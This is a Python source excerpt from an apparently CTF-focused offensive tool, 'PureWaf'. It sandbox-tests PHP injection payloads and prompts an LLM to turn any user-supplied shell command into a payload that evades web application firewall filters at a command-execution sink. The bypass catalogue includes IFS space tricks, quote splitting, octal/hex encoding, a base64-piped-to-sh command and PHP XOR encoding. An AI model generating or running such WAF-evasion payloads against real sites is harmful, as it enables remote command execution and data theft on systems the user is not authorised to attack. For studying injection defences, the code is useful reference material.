                sink_kind=sink_kind,
                payload_context=payload_context,
                skipped=True,
                reason="payload context is not supported by PHP CLI sandbox validation",
            )

        sandbox_payload = self._sandbox_flag_payload(payload, flagfile, sandbox_flag)
        script = self._build_validation_script(validation_mode, sandbox_payload)
        script_path = sandbox / f"validate-{uuid.uuid4().hex}.php"
        script_path.write_text(script, encoding="utf-8")

        try:
            proc = subprocess.run(
                [php_bin, str(script_path)],
                cwd=str(sandbox),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                check=False,
                timeout=VALIDATION_TIMEOUT_SECONDS,
            )
            output = proc.stdout.decode("utf-8", "replace")
        except subprocess.TimeoutExpired:
            return PayloadValidationResult(
                payload=payload,
                sink_kind=sink_kind,
                payload_context=payload_context,
                attempted=True,
                reason=f"validation timed out after {VALIDATION_TIMEOUT_SECONDS}s",
            )
        except Exception as exc:
            return PayloadValidationResult(
                payload=payload,
                sink_kind=sink_kind,
                payload_context=payload_context,
                skipped=True,
                reason=f"validation failed to start: {exc}",
            )

        expected_b64 = base64.b64encode(flag_marker.encode("utf-8")).decode("ascii")
        passed = flag_marker in output or expected_b64 in output
        reason = "payload produced sandbox flag marker" if passed else "sandbox output did not contain flag marker"
        return PayloadValidationResult(
            payload=payload,
            sink_kind=sink_kind,
            payload_context=payload_context,
            attempted=True,
            passed=passed,
            reason=reason,
            output_excerpt=output,
        )

    @staticmethod
    def _choose_validation_mode(payload: str, sink_kind: str, payload_context: str) -> str:
        lowered = (payload or "").strip().lower()
        if sink_kind == "file_read_path":
            return "file_read_path"
        if payload_context == "php_code":
            return "php_code"
        if payload_context == "shell_command":
            return "shell_command"
        if payload_context == "any":
            if lowered.startswith(("php://", "file://", "data://")) or "/flag" in lowered:
                return "file_read_path"
            if lowered.startswith(("<?", "system(", "echo ", "$", "eval(", "assert(")):
                return "php_code"
        return ""

    @staticmethod
    def _sandbox_flag_payload(payload: str, flagfile: str, sandbox_flag: Path) -> str:
        flag_path = sandbox_flag.as_posix()
        rewritten = str(payload or "")
        configured_flag = flagfile or ""
        if configured_flag and configured_flag in rewritten:
            return rewritten.replace(configured_flag, flag_path, 1)
        if "/flag" in rewritten:
            rewritten = rewritten.replace("/flag", flag_path, 1)
        return rewritten

    @staticmethod
    def _build_validation_script(mode: str, payload: str) -> str:
        encoded_payload = base64.b64encode(payload.encode("utf-8", "replace")).decode("ascii")
        if mode == "file_read_path":
            runner = """
$path = base64_decode($payload_b64);
$out = @file_get_contents($path);
if ($out !== false) {
    echo $out;
}
"""
        elif mode == "shell_command":
            runner = """
$cmd = base64_decode($payload_b64);
ob_start();
$out = shell_exec($cmd);
if ($out !== null) { echo $out; }
$ob = ob_get_clean();
if ($ob) { echo $ob; }
"""
        else:
            runner = """
$payload = base64_decode($payload_b64);
$candidate = __DIR__ . DIRECTORY_SEPARATOR . 'candidate-' . bin2hex(random_bytes(4)) . '.php';
if (!preg_match('/^\\s*<\\?(php|=)?/i', $payload)) {
    $payload = "<?php\\n" . $payload;
}
file_put_contents($candidate, $payload);
ob_start();
try {
    include $candidate;
} catch (Throwable $e) {
    echo "PUREWAF_AGENT_VALIDATION_ERROR:" . $e->getMessage();
}
$out = ob_get_clean();
echo $out;
"""
        return "<?php\n$payload_b64 = '" + encoded_payload + "';\n" + runner

    @staticmethod
    def _parse_payload_review(content: str) -> LlmPayloadReview:
        parsed = PureWafLlmSinkAgent._load_json_content(content)
        payload_value = str(parsed.get("payload_value", "") or "").strip()[:1000]
        fallback_payload = str(parsed.get("fallback_payload", "") or "").strip()[:1000]
        if not payload_value and fallback_payload:
            payload_value = fallback_payload
        if not fallback_payload and payload_value:
            fallback_payload = payload_value
        return LlmPayloadReview(
            valid=bool(parsed.get("valid", False)),
            fallback_payload=fallback_payload,
            payload_value=payload_value,
            request_path=str(parsed.get("request_path", "") or "").strip()[:1000],
            request_headers=PureWafProjectAgent._parse_string_dict(
                parsed.get("request_headers", parsed.get("headers", {})),
                value_limit=1200,
            ),
            request_cookies=PureWafProjectAgent._parse_string_dict(
                parsed.get("request_cookies", parsed.get("cookies", {})),
                value_limit=1200,
            ),
            payload_context=str(parsed.get("payload_context", "") or "").strip()[:80],
            source=str(parsed.get("source", "") or "").strip()[:80],
            evidence=str(parsed.get("evidence", "") or "").strip()[:600],
            notes=str(parsed.get("notes", "") or "").strip()[:500],
        )

    @staticmethod
    def _parse_string_dict(raw, value_limit: int = 500) -> Dict[str, str]:
        if not isinstance(raw, dict):
            return {}
        out: Dict[str, str] = {}
        for key, value in list(raw.items())[:20]:
            clean_key = re.sub(r"[\r\n:]+", "", str(key or "")).strip()[:120]
            clean_value = re.sub(r"[\r\n]+", " ", str(value or "")).strip()[:value_limit]
            if clean_key and clean_value:
                out[clean_key] = clean_value
        return out

    def generate_custom_command_bypass(
        self,
        source: str,
        command: str,
        event_callback=None,
    ) -> Dict[str, str]:
        if event_callback:
            event_callback("[*] Custom command bypass: loading LLM settings")
        settings, error = self._load_settings()
        if error:
            return {"payload": "", "notes": "", "error": error}

        if event_callback:
            event_callback("[*] Custom command bypass: analyzing WAF constraints and generating payload")
        content, endpoint, chat_error = self._chat_completion(
            settings,
            self.build_custom_command_messages(source, command),
            max_tokens=1000,
        )
        if chat_error:
            return {"payload": "", "notes": "", "error": chat_error}

        if event_callback:
            event_callback(f"[*] Custom command bypass: LLM responded (model={settings.model})")
        try:
            parsed = self._load_json_content(content)
            return {
                "payload": str(parsed.get("payload", "") or "").strip()[:1000],
                "notes": str(parsed.get("notes", "") or "").strip()[:500],
                "error": "",
            }
        except Exception as exc:
            return {"payload": "", "notes": "", "error": f"LLM response invalid: {exc}"}

    def build_custom_command_messages(
        self,
        source: str,
        command: str,
    ) -> List[Dict[str, str]]:
        tamper_desc = self._describe_tamper_techniques()
        bypass_desc = self._describe_bypass_templates()
        return [
            {
                "role": "system",
                "content": (
                    self._immutable_context(
                        "Custom command bypass generation for a detected command_exec sink."
                    )
                    + "\n\n"
                    "You are a CTF Web expert generating WAF-bypass payloads for PureWaf. "
                    "The user wants to execute a specific shell command through a detected "
                    "command_exec sink that has WAF filtering. Your job:\n"
                    "1. Analyze the PHP source to understand the WAF constraints (blocked words, "
                    "chars, regex patterns, length limits, sanitizers).\n"
                    "2. Determine if the user's command can pass the WAF as-is.\n"
                    "3. If blocked, transform the command using these bypass techniques:\n"
                    f"{tamper_desc}\n\n"
                    f"{bypass_desc}\n\n"
                    "4. Return a single payload that executes the equivalent of the user's command "
                    "while bypassing all detected WAF rules. The payload must fit the sink's "
                    "execution context (shell_command or php_code).\n\n"
                    "Return only JSON: {\"payload\":\"the_bypass_payload\","
                    "\"notes\":\"short explanation of what was bypassed and how\"}.\n"
                    "Do not include exploitation steps or prose outside JSON."
                ),
            },
            {
                "role": "user",
                "content": (
                    f"PHP source:\n{source[:MAX_PROJECT_SOURCE_BYTES]}\n\n"
                    f"User command to execute: {command}\n\n"
                    "Generate a WAF-bypass payload for this command."
                ),
            },
        ]

    @staticmethod
    def _describe_tamper_techniques() -> str:
        from . import tamper
        lines = ["Available tamper/bypass techniques:"]
        for plugin in tamper.get_plugins():
            lines.append(f"- {plugin.name}: {plugin.description}")
        return "\n".join(lines)

    @staticmethod
    def _describe_bypass_templates() -> str:
        return (
            "Available bypass patterns:\n"
            "- Space bypass: ${IFS}, $IFS$9, \\t, +, %09, <>, {cmd,arg}\n"
            "- Slash bypass: ${PWD:0:1}, ${HOME:0:1}\n"
            "- Word bypass: single quotes (ca''t), double quotes (ca\"\"t), "
            "backslashes (c\\a\\t), uninitialized vars (ca${x}t)\n"
            "- Encoding: octal ($'\\143\\141\\164'), base64 pipe "
            "(echo Y2F0IC9mbGFn|base64 -d|sh), hex ($'\\x63\\x61\\x74')\n"
            "- Wildcard: /f?ag, /fl*, cat /???g, /bin/ca? /fla?\n"
            "- Variable construction: a=ca;b=t;$a$b /flag\n"
            "- PHP wrappers: backticks (`cmd`), system(), passthru(), "
            "shell_exec(), exec()\n"
            "- PHP encoding: chr() construction, XOR encoding, NOT encoding\n"
            "- Newline bypass: %0a as command separator\n"
            "- Semicolon alternatives: || , && , %0a, \\n"
        )
